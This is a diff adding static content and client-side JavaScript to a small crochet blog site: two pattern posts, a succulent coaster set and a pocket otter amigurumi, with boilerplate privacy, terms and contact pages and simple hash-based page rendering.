+                id: 'succulent-coaster-set',
+                title: 'Beautiful Crochet Succulent Coaster Set Pattern with Pot Holder',
+                date: 'May 4, 2026',
+                image: './assets/succulent-coaster-set.png',
+                excerpt: 'Transform your coffee table into a thriving indoor garden with this gorgeous Succulent Coaster Set crochet pattern! 🪴 When not in use, these lovely leaf-shaped green coasters stack together beautifully inside a cute, smiling terracotta-colored pot, looking exactly like a real potted succulent! This ingenious, highly functional home decor project is perfect for keeping water rings off your furniture while adding a cozy, handmade touch to your living room. The pattern features a detailed step-by-step video tutorial, making it a fantastic project for intermediate crafters or adventurous beginners looking to practice textured stitches. 🍃\n\n✨ Why you\'ll love this set:\n* Super functional coasters that double as cute home decor when stacked!\n* Makes the ultimate eco-friendly housewarming gift for plant lovers!\n\nAdd some handmade greenery to your home today! Save for later! #SucculentCoaster #CrochetCoasters #CrochetHomeDecor #PlantLoversCraft #CrochetGift #YarnLovers',
+                content: `
+<p>Bring the beauty of nature indoors without any of the watering hassle! If you love plants and handmade home decor, this succulent planter coaster set is the ultimate project for your crochet hook. It is an incredibly clever design: when you need them, you have a set of highly absorbent, textured green coasters to protect your furniture from water rings. When you are done, simply fold and stack them together inside their cute, smiling terracotta-colored pot, and they transform instantly into a lovely potted succulent ornament that adds a cozy, handmade touch to any coffee table, desk, or shelf.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Create a functional, modular home decor set that doubles as a cute potted plant when stacked.</li>
+    <li>Master textured stitches like the double crochet cluster to mimic organic, overlapping succulent leaves.</li>
+    <li>Discover why 100% cotton yarn is essential for making durable, highly absorbent drink coasters.</li>
+    <li>Crochet a sturdy terracotta planter pot sleeve with a charming, friendly embroidered smile.</li>
+    <li>The perfect eco-friendly housewarming gift for plant lovers, teachers, and cozy craft enthusiasts.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Essential Materials for Your Green Oasis</h2>
+<p>To craft a coaster set that is both beautiful and highly functional, selecting the right yarn is key. Coasters need to absorb condensation from cold drinks and protect surfaces from hot mugs, which is why we strongly recommend using 100% medium-weight cotton yarn (such as Lily Sugar\'n Cream, Peaches & Creme, or Paintbox Yarns Cotton Aran). Cotton is incredibly absorbent, heat-resistant, and washes beautifully, ensuring your coasters last for years.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Avoid acrylic yarns for coasters! Acrylic is made from plastic fibers, which means it won\'t absorb water and can actually melt if you place a piping hot mug of coffee or tea directly on top of it.</p>
+
+<p>For your color palette, gather a beautiful sage green or deep forest green for the leafy coasters, a warm terracotta orange or sandy brown for the planter pot, and a tiny scrap of black embroidery thread to sew on the cute smiling face. You will also need a 4.0mm (G) crochet hook, a darning needle, stitch markers, and two 8mm safety eyes to bring your cute planter pot to life.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Crocheting the Leafy Succulent Coasters</h2>
+<p>Each leaf coaster is worked in flat, expanding rounds to create a beautifully detailed, multi-pointed star shape that mimics real succulent foliage. The pattern utilizes a combination of basic stitches along with textured clusters and delicate picots at the tips to give each petal a sharp, organic finish.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Stitching the Petals and Leaves</h3>
+<p>Using your sage green cotton yarn, start with a magic ring and work 6 single crochets inside. In round two, work increases around to reach 12 stitches. In round three, expand the circle to 18 stitches. To begin shaping the individual leaves, round four will utilize a pattern of slip stitches, chains, and double crochet clusters worked into a single stitch, which flares out to create five or six distinct leafy points around the edge of the circle.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> When crocheting the leaf tips, make sure to pull your slip stitches snug. This sharpens the points, giving your succulent coasters a beautifully realistic, crisp leafy silhouette.</p>
+
+<p>Repeat this process to create four to six matching green coasters. Once finished, block them flat by spraying them with water and letting them dry under a heavy book. This ensures they lay perfectly flat on your tables and stack together neatly inside the pot.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Crafting the Smiling Terracotta Planter Pot</h2>
+<p>The planter pot is worked in the round from the bottom up, using thick, dense stitches like the waistcoat or thermal stitch to ensure the walls are sturdy enough to hold their shape without collapsing when empty. It features a folded-down rim that gives it that classic clay-pot look, complete with a charming, friendly embroidered smile.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight: Creating the Cozy Stacking System</h3>
+  <p>To make stacking easy, the pot is designed to be slightly wider at the top than the base. When you fold each green coaster in half twice (into a neat triangle shape) and slide them down into the pot, their points naturally overlap and fan outwards. This creates a beautifully layered, dense green canopy that looks exactly like a real, thriving succulent growing right out of its pot!</p>
+</div>
+
+<p>Start the base using terracotta yarn, increasing up to 36 stitches over several rounds. Work in the back loops only (BLO) for one round to create a flat bottom that sits securely on surfaces. Continue working even rounds upwards until the pot is about four inches tall, then work a folded-down collar in front loops only. Install the safety eyes between rounds 8 and 9, and use black thread to stitch a simple, happy V-shaped smile between them.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Packaging, Gifting, and Selling Your Creations</h2>
+<p>If you enjoy selling your handmade goods at local craft markets or in an online shop, these succulent coaster sets are absolute bestsellers! They are highly interactive, visually charming, and have a high perceived value. To display them beautifully, stack the coasters inside the smiling pot, tie a rustic piece of jute twine around the center with a handmade tag, and they will fly off your shelves. They make the perfect, unique housewarming gift, a lovely thank-you token for teachers, or a wonderful self-care treat to brighten up your own coffee table.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Planter Coaster Care Guide</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Machine wash the cotton coasters in cold water on a delicate cycle if they get dirty from coffee or tea spills.</li>
+    <li>Lay flat to dry and iron on a warm cotton setting to restore their perfectly flat, crisp leaf shape.</li>
+    <li>Hand wash the smiling planter pot sleeve to protect the safety eyes and delicate embroidered face detailing.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Succulent Coasters</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Crochet Coaster Set</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plant Crochet Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cotton Home Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Market Prep Crafts</span>
+</div>
+`
+            },
+            {
+                id: 'pocket-otter',
+                title: 'Adorable No-Sew Pocket Otter Amigurumi Crochet Pattern',
+                date: 'June 12, 2026',
+                image: './assets/pocket-otter.png',
+                excerpt: 'Say hello to your new favorite pocket-sized companion—the Pocket Otter! 🦦 This incredibly sweet, no-sew amigurumi pattern is designed to be super fast, easy, and completely seamless. Crocheted in ultra-plush chenille yarn, this tiny otter has the most charming chubby belly, a adorable little snout, and a cute flat tail. Because it requires zero sewing, it is a dream project for quick crafting sessions, craft fair inventory, or sweet handmade gifts. You can make an entire family of otters in an afternoon! Grab your favorite shades of chocolate and cream yarn and let\'s dive in! 🌊\n\n✨ Pro tips for success:\n* Use safety eyes with a secure back washer for child-safe play, or embroider the eyes for infants!\n* Keep your tension snug so the fiberfill stuffing doesn\'t peek through the fluffy stitches!\n\nYou won\'t want to forget this adorable otter pattern! Save for later! #PocketOtter #AmigurumiOtter #NoSewCrochet #PlushCrochet #CuteAmigurumi #CrochetCommunity',
+                content: `
+<p>Get ready to fall completely head over heels in love with your next quick-crafting obsession! Otters are widely adored for their playful personalities and sweet faces, and now you can bring one to life in the palm of your hand with this incredibly fast, beginner-friendly pocket otter pattern. This design is completely no-sew, meaning you work the tiny arms, legs, muzzle, and flat tail directly into the body as you go. When you pull through your final loop, your adorable little otter is fully assembled and ready to snuggle, saving you from tedious needle sewing!</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Construct a charming pocket-sized otter amigurumi with absolutely zero sewing required.</li>
+    <li>Learn how to work limbs, muzzle, and a flat tail directly into the body as you crochet.</li>
+    <li>Use plush chenille or velvet yarns to create an ultra-soft, squishy, and premium toy.</li>
+    <li>A fantastic, rapid scrap-buster project that is perfect for scaling craft fair inventory.</li>
+    <li>Easily customize facial expressions with safety eyes or delicate embroidery details.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Choosing the Warmest Cozy Supplies</h2>
+<p>For that irresistible, chubby, and ultra-soft feel shown in the sample images, we highly recommend using a super-bulky plush chenille yarn (frequently classified as Size 6 weight). Brands like Premier Parfait Chunky, Bernat Velvet, or Himalaya Dolphin Baby are stellar choices that yield gorgeous stitch definition and a lovely velvety finish. You will need a primary chocolate brown or chestnut shade for the body and tail, and a small scrap of soft cream or ivory yarn for the muzzle and belly patch.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When working with plush chenille yarn, avoid pulling too tightly on your magic ring tail as it can easily snap. Instead, work two chains, crochet into the second chain from your hook, and tighten the center stitch gently.</p>
+
+<p>Pair your cozy yarn with a 4.5mm or 5.0mm crochet hook to ensure your stitches are tight and dense. Gather two 10mm safety eyes, a small scrap of black embroidery floss to sew on the tiny nose, high-quality polyester fiberfill, a darning needle, and several stitch markers to keep your place in continuous rounds.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Comprehensive Step-by-Step Otter Tutorial</h2>
+<p>This charming little otter is worked from the snout down to the tail in one single, continuous piece. The ears, arms, legs, and tail are created using popcorn stitches or chains worked directly into the rounds, ensuring you do not have to sew a single piece on later.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Stitching the Head, Body, and Limbs</h3>
+<p>Start with your cream yarn to crochet the muzzle, working a quick oval in the round. Switch to brown yarn to begin the head, expanding from 6 to 18 stitches. To form the tiny, cute ears without sewing, you will work a simple slip stitch and half double crochet cluster directly into the head stitches on round five, spacing them beautifully on either side of the crown.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Install your safety eyes right next to the cream muzzle on round six, securing the washers tightly before you begin stuffing the head firmly with fiberfill.</p>
+
+<p>As you continue down to work the body, switch to a simple cream belly panel on the front. To form the tiny paws, you will work 3 double crochet popcorn stitches directly into the brown side stitches, switching colors seamlessly. Finally, shape the flat tail using decreasing rows at the base, slip stitching the bottom closed for a clean, professional finish.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters: The Power of No-Sew Amigurumi Patterns</h3>
+  <p>No-sew patterns are a major time-saver, but they also result in much sturdier, child-safe plushies. Traditional sewn-on limbs can loosen over time with rough play, whereas integrated limbs are crocheted directly into the fabric, making them virtually impossible to pull off. This makes no-sew amigurumi the perfect choice for creating durable, premium baby toys or high-quality stock for busy craft fairs.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Styling, Gifting, and Social Media Display</h2>
+<p>Once you finish your sweet pocket otter, there are so many fun ways to style them! You can crochet a tiny green leaf or a small gold fish to place in their paws, mimicking real otters floating on their backs. For online shops and social media videos, take photos of your otters nested in a small wooden bowl or resting on a blue, water-textured blanket. Packaged with a rustic paper wrap around their bellies, these charming little creatures make irresistible, pocket-sized gifts that customers of all ages will immediately want to adopt and take home.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Quick Otter Crafting Tips</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Keep your tension snug around the limb switches to prevent any stuffing from showing near the paws.</li>
+    <li>Add a tiny touch of pink blush just below the eyes to give your otter a sweet, rosy-cheeked look.</li>
+    <li>Use a tapestry needle to sculpt the face slightly, pulling the eyes inward for an extra-cute expression.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Pocket Otter</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">No-Sew Amigurumi</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Plush Otter Pattern</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cute Amigurumi Toys</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Quick Crochet Gifts</span>
+</div>
+`
+            },
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Crafty Haven</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Crafty Haven, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Crafty Haven Edit";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // Yarn Basket Avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt.replace(/\\n/g, '<br>')}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: var(--crafty-dark);">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: var(--crafty-dark);">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
